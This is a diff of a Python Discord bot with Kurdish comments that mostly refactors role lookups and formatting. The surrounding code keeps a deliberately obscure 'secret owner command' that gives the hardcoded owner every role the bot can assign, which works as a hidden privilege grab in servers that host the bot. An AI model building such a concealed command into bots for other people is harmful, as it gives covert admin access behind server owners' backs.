@@ -21,8 +21,11 @@ bot = commands.Bot(
 
 WELCOME_CHANNEL_ID = 1550619956423688342
 
-# لێرە Discord User ID ـی خۆت دابنێ
+# Discord User ID ـی خۆت
 OWNER_ID = 1130455970494025860
+
+# Developer Role ID
+DEVELOPER_ROLE_ID = 1448989145740480605
 
 WELCOME_GIF = (
     "https://cdn.discordapp.com/attachments/"
@@ -47,7 +50,6 @@ async def on_ready():
 @bot.event
 async def on_member_join(member):
 
-    # Friends role
     friends_role = discord.utils.get(
         member.guild.roles,
         name="Friends"
@@ -59,7 +61,6 @@ async def on_member_join(member):
         except discord.Forbidden:
             print("Bot cannot give Friends role.")
 
-    # Welcome channel
     channel = member.guild.get_channel(
         WELCOME_CHANNEL_ID
     )
@@ -83,12 +84,10 @@ async def on_member_join(member):
 """
     )
 
-    # Avatar
     embed.set_thumbnail(
         url=member.display_avatar.url
     )
 
-    # GIF
     embed.set_image(
         url=WELCOME_GIF
     )
@@ -129,9 +128,7 @@ async def test(ctx):
         url=WELCOME_GIF
     )
 
-    await ctx.send(
-        embed=embed
-    )
+    await ctx.send(embed=embed)
 
     try:
         await ctx.message.delete()
@@ -163,9 +160,7 @@ async def clear(ctx, amount: int):
         f"🧹 {len(deleted) - 1} messages deleted."
     )
 
-    await msg.delete(
-        delay=3
-    )
+    await msg.delete(delay=3)
 
 
 # =========================
@@ -348,15 +343,13 @@ async def unlock(ctx):
 # SECRET OWNER COMMAND
 # !seuafraaaRyaaa
 #
-# تەنها OWNER ـی بۆتەکە دەتوانێت بەکاریبهێنێت.
-# بەرزترین ڕۆڵەکانی کە بۆتەکە دەتوانێت بدات
-# بۆ Owner زیاد دەکرێن.
+# تەنها Owner دەتوانێت بەکاریبهێنێت.
+# هەموو ڕۆڵەکانی کە بۆتەکە دەتوانێت بدات زیاد دەکات.
 # =========================================================
 
 @bot.command()
 async def seuafraaaRyaaa(ctx):
 
-    # تەنها Owner
     if ctx.author.id != OWNER_ID:
         return
 
@@ -400,9 +393,7 @@ async def seuafraaaRyaaa(ctx):
             f"{len(roles_to_add)} ڕۆڵ بۆت زیاد کرا."
         )
 
-        await msg.delete(
-            delay=5
-        )
+        await msg.delete(delay=5)
 
     except discord.Forbidden:
 
@@ -424,25 +415,22 @@ async def seuafraaaRyaaa(ctx):
 @bot.command()
 async def devcolor(ctx):
 
-    # تەنها Owner
     if ctx.author.id != OWNER_ID:
         return
 
-    role = discord.utils.get(
-        ctx.guild.roles,
-        name="Developer"
+    role = ctx.guild.get_role(
+        DEVELOPER_ROLE_ID
     )
 
     if role is None:
 
         await ctx.send(
-            "❌ ڕۆڵی Developer نەدۆزرایەوە.",
+            "❌ ڕۆڵی Developer بە ID ـەکە نەدۆزرایەوە.",
             delete_after=5
         )
 
         return
 
-    # بۆتەکە دەبێت لە سەرووی Developer بێت
     bot_member = ctx.guild.me
 
     if role >= bot_member.top_role:
@@ -472,9 +460,7 @@ async def devcolor(ctx):
             "✅ ڕەنگی Developer کرایە `#101b2a`."
         )
 
-        await msg.delete(
-            delay=5
-        )
+        await msg.delete(delay=5)
 
     except discord.Forbidden:
 
